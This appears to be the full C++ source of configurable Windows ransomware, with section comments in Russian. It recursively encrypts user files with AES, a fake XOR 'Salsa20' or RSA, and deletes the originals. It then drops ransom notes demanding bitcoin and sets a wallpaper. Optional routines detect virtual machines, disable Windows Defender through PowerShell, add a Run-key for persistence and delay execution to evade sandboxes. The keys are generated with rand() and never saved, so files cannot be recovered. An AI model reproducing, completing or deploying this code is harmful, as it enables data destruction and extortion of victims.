#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <random>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ ПАТЧИНГА (С ФИКСИРОВАННЫМИ РАЗМЕРАМИ)
// ============================================================
char g_Drives[256] = "C:\\|D:\\";
char g_Exts[1024] = ".txt|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.pdf|.jpg|.jpeg|.png|.gif|.bmp|.zip|.rar|.7z|.tar|.gz|.db|.sql|.sqlite|.pem|.key|.crt|.pfx|.p12|.cs|.cpp|.c|.h|.java|.class|.py|.js|.html|.css|.php|.asp|.xml|.json|.log|.bak|.old|.tmp";
char g_Exclude[1024] = "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)|C:\\ProgramData|C:\\System Volume Information|$Recycle.Bin";
char g_EncryptedExt[16] = ".enc";
char g_WallpaperBase64[16384] = "";
char g_WallpaperExt[8] = ".jpg";
char g_NoteName[64] = "READ_ME.txt";
char g_NoteContent[4096] = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
char g_FakeName[64] = "svchost.exe";
char g_IncludeFolders[1024] = "";
unsigned char g_FakeEnabled = 0;
unsigned char g_HideEnabled = 0;
unsigned char g_AntiVM = 0;
unsigned char g_DisableDefender = 0;
unsigned char g_Persistence = 0;
unsigned char g_HideFiles = 0;
unsigned char g_SandboxDelay = 0;
unsigned char g_Algo = 0; // 0=AES, 1=Salsa20, 2=RSA

// ============================================================
// AES-256-CBC (Windows CryptoAPI)
// ============================================================
class AES_CBC {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    unsigned char key[32];
    unsigned char iv[16];
    
public:
    AES_CBC() : hProv(NULL), hKey(NULL) {
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        
        srand(GetTickCount() ^ GetCurrentProcessId());
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 16; i++) iv[i] = rand() % 256;
        
        struct {
            BLOBHEADER hdr;
            DWORD keySize;
            BYTE keyBytes[32];
        } keyBlob;
        
        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.keySize = 32;
        memcpy(keyBlob.keyBytes, key, 32);
        
        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
        
        DWORD mode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv, 0);
    }
    
    ~AES_CBC() {
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey || input.empty()) return false;
        
        DWORD dataLen = input.size();
        DWORD encLen = dataLen + 16;
        
        output.resize(encLen + 16);
        memcpy(output.data(), iv, 16);
        memcpy(output.data() + 16, input.data(), dataLen);
        
        DWORD outLen = dataLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 16, &outLen, encLen)) {
            return false;
        }
        
        output.resize(outLen + 16);
        return true;
    }
};

// ============================================================
// SALSA20 (упрощенная версия для демонстрации)
// ============================================================
class Salsa20 {
private:
    unsigned char key[32];
    unsigned char nonce[8];
    
public:
    Salsa20() {
        srand(GetTickCount() ^ GetCurrentProcessId());
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
    }
    
    void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        output.resize(input.size() + 8);
        memcpy(output.data(), nonce, 8);
        
        for (size_t i = 0; i < input.size(); i++) {
            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
        }
    }
};

// ============================================================
// RSA (упрощенная версия)
// ============================================================
class RSA_Encrypt {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    
public:
    RSA_Encrypt() : hProv(NULL), hKey(NULL) {
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
    }
    
    ~RSA_Encrypt() {
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey || input.empty()) return false;
        
        DWORD encLen = 0;
        DWORD dataLen = input.size();
        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
        encLen = dataLen;
        
        output.resize(encLen);
        memcpy(output.data(), input.data(), input.size());
        
        DWORD outLen = input.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {
            return false;
        }
        return true;
    }
};

// ============================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
std::vector<std::string> split_string(const std::string& str, char delimiter) {
    std::vector<std::string> result;
    std::stringstream ss(str);
    std::string item;
    while (std::getline(ss, item, delimiter)) {
        if (!item.empty()) result.push_back(item);
    }
    return result;
}

void to_lowercase(std::string& str) {
    std::transform(str.begin(), str.end(), str.begin(), ::tolower);
}

// ============================================================
// УСТАНОВКА ОБОЕВ ИЗ BASE64
// ============================================================
void set_wallpaper(const std::string& base64_data, const std::string& ext) {
    if (base64_data.empty()) return;
    
    DWORD size = 0;
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
    if (size == 0) return;
    
    std::vector<BYTE> data(size);
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
    
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    std::string wall_path = std::string(temp_path) + "wall" + ext;
    
    std::ofstream out(wall_path, std::ios::binary);
    out.write((char*)data.data(), data.size());
    out.close();
    
    if (GetFileAttributesA(wall_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

// ============================================================
// ПЕРСИСТЕНТНОСТЬ
// ============================================================
void add_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }
}

// ============================================================
// СКРЫТИЕ ФАЙЛОВ
// ============================================================
void hide_files(const std::string& ext) {
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    
    for (char* d = drives; *d; d += strlen(d) + 1) {
        std::string drive = d;
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_regular_file()) {
                    std::string path = entry.path().string();
                    if (path.length() >= ext.length() && path.substr(path.length() - ext.length()) == ext) {
                        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    }
                }
            }
        } catch (...) {}
    }
}

// ============================================================
// ОБНАРУЖЕНИЕ VM
// ============================================================
bool detect_vm() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                std::string name = pe.szExeFile;
                to_lowercase(name);
                if (name.find("vbox") != std::string::npos ||
                    name.find("vmware") != std::string::npos ||
                    name.find("virtual") != std::string::npos ||
                    name.find("qemu") != std::string::npos) {
                    CloseHandle(snap);
                    return true;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return false;
}

// ============================================================
// ОТКЛЮЧЕНИЕ DEFENDER
// ============================================================
void disable_defender() {
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
}

// ============================================================
// МАСКИРОВКА ПРОЦЕССА
// ============================================================
void fake_process_name() {
    SetConsoleTitleA(g_FakeName);
}

// ============================================================
// СКРЫТИЕ ПРОЦЕССА
// ============================================================
void hide_process() {
    try {
        SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
    } catch (...) {}
}

// ============================================================
// ШИФРОВАНИЕ ФАЙЛА
// ============================================================
void encrypt_file(const std::string& path, const std::string& ext, int algo) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        std::vector<BYTE> encrypted;
        bool success = false;
        
        switch (algo) {
            case 0: {
                AES_CBC aes;
                success = aes.Encrypt(data, encrypted);
                break;
            }
            case 1: {
                Salsa20 salsa;
                salsa.Encrypt(data, encrypted);
                success = true;
                break;
            }
            case 2: {
                RSA_Encrypt rsa;
                success = rsa.Encrypt(data, encrypted);
                break;
            }
            default: return;
        }
        
        if (!success || encrypted.empty()) return;
        
        std::string out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileA(path.c_str());
    } catch (...) {}
}

// ============================================================
// ОБХОД И ШИФРОВАНИЕ
// ============================================================
void walk_and_encrypt(const std::string& start_path,
                      const std::vector<std::string>& extensions,
                      const std::vector<std::string>& exclude_folders,
                      const std::string& encrypted_ext,
                      int algo) {
    try {
        for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
            if (entry.is_directory()) continue;
            
            std::string full_path = entry.path().string();
            bool excluded = false;
            for (const auto& ex : exclude_folders) {
                if (full_path.find(ex) == 0) {
                    excluded = true;
                    break;
                }
            }
            if (excluded) continue;
            
            std::string ext = entry.path().extension().string();
            to_lowercase(ext);
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                encrypt_file(full_path, encrypted_ext, algo);
            }
        }
    } catch (...) {}
}

// ============================================================
// РАЗМЕЩЕНИЕ ЗАПИСОК
// ============================================================
void drop_notes(const std::vector<std::string>& drives,
                const std::vector<std::string>& exclude_folders,
                const std::string& note_name,
                const std::string& note_content) {
    for (const auto& drive : drives) {
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_directory()) {
                    std::string note_path = entry.path().string() + "\\" + note_name;
                    
                    bool excluded = false;
                    for (const auto& ex : exclude_folders) {
                        if (entry.path().string().find(ex) == 0) {
                            excluded = true;
                            break;
                        }
                    }
                    if (excluded) continue;
                    
                    if (!std::filesystem::exists(note_path)) {
                        std::ofstream out(note_path);
                        out << note_content;
                        out.close();
                    }
                }
            }
        } catch (...) {}
    }
}

// ============================================================
// ГЛАВНАЯ ФУНКЦИЯ
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(GetTickCount() ^ GetCurrentProcessId());
    
    // Anti-VM
    if (g_AntiVM && detect_vm()) return 0;
    
    // Маскировка
    if (g_FakeEnabled) fake_process_name();
    if (g_HideEnabled) hide_process();
    
    // Отключение Defender
    if (g_DisableDefender) disable_defender();
    
    // Персистентность
    if (g_Persistence) add_persistence();
    
    // Задержка для обхода песочниц
    if (g_SandboxDelay) Sleep(60000);
    
    // Парсинг настроек
    std::string drives_str = g_Drives;
    std::string exts_str = g_Exts;
    std::string exclude_str = g_Exclude;
    std::string include_str = g_IncludeFolders;
    std::string encrypted_ext = g_EncryptedExt;
    
    auto drives = split_string(drives_str, '|');
    auto extensions = split_string(exts_str, '|');
    auto exclude_folders = split_string(exclude_str, '|');
    auto include_folders = split_string(include_str, '|');
    int algo = g_Algo;
    
    // Если указаны конкретные папки для шифрования
    std::vector<std::string> targets = drives;
    if (!include_folders.empty() && !(include_folders.size() == 1 && include_folders[0].empty())) {
        targets = include_folders;
    }
    
    // Запуск шифрования в потоках
    std::vector<std::thread> threads;
    for (const auto& target : targets) {
        threads.emplace_back(walk_and_encrypt, target, std::ref(extensions),
                           std::ref(exclude_folders), std::ref(encrypted_ext), algo);
    }
    for (auto& t : threads) t.join();
    
    // Скрытие зашифрованных файлов
    if (g_HideFiles) hide_files(encrypted_ext);
    
    // Размещение записок
    std::string note_name = g_NoteName;
    std::string note_content = g_NoteContent;
    drop_notes(drives, exclude_folders, note_name, note_content);
    
    // Установка обоев
    set_wallpaper(g_WallpaperBase64, g_WallpaperExt);
    
    return 0;
}
